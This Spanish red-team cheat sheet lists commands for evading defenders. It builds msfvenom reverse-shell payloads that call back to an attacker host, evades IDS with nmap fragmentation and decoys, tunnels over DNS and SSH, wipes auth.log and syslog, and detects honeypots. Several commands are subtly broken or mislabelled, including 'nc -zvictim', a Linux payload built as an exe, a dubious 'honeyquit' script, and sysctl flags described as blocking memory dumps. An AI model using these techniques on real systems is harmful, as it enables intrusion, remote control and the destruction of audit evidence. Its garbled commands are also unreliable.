# Red Team - Fase 4: Ataques a Blue Team (Red vs Blue)

## 1. Evasion de IDS/IPS

### 1.1 Fragmentación

```bash
# Fragmentar paquetes
nmap -f 192.168.1.77

# Custom fragmentación
nmap -f -f 2 192.168.1.77
```

### 1.2Ofuscación

```bash
# decoys
nmap -D RND:10 192.168.1.77

# Source port
nmap -g 53 192.168.1.77

# Timing slower
nmap -T0 -T1 192.168.1.77
```

### 1.3 Payload Variations

```bash
# Different encoding
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe

# Polymorphic
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/additive -o shell.exe
```

---

## 2. Evasion de Firewall

### 2.1 Port Knocking

```bash
# Secuencia de puertos
iptables -A INPUT -p tcp --dport 9001 -j ACCEPT
iptables -A INPUT -p tcp --dport 9002 -j ACCEPT
iptables -A INPUT -p tcp --dport 9003 -j ACCEPT

# Knock sequence
for port in 9001 9002 9003; do nc -zvictim $port; done
```

### 2.2 Tunneling

```bash
# DNS tunneling
sudo /usr/bin/iodine -f 192.168.1.10 mydns

# SSH tunneling
ssh -L 8080:localhost:80 user@192.168.1.77
```

---

## 3. Anti-Forensics

### 3.1 Log Clearing

```bash
# Linux
echo > /var/log/auth.log
echo > /var/log/syslog

# timestamps
touch -r original file modifications
```

### 3.2 Memory Anti-Forensics

```bash
# Evitar memory dump
sysctl -w kernel.kptr_restrict=1
sysctl -w kernel.dmesg_restrict=1
```

---

## 4. Detección de Honeypots

### 4.1 Honeyd Detection

```bash
# Detectar honeypot
nmap --script honeyquit 192.168.1.77
```

### 4.2 Tarpits

```bash
# Detectar tarpits
nc -zv 192.168.1.77 80
# Si conexión muy lenta, posible tarpit
```

---

## Resumen

| Técnica | Contra |
|---------|--------|
| Fragmentación | Snort/Suricata |
| Ofuscación | IDS signatures |
| Port knocking | Firewall rules |
| DNS tunnel | DNS monitoring |
| Log clearing | Remote logging |

---

## Recursos

- Counter IDS/IPS techniques
- NSE scripts for evasion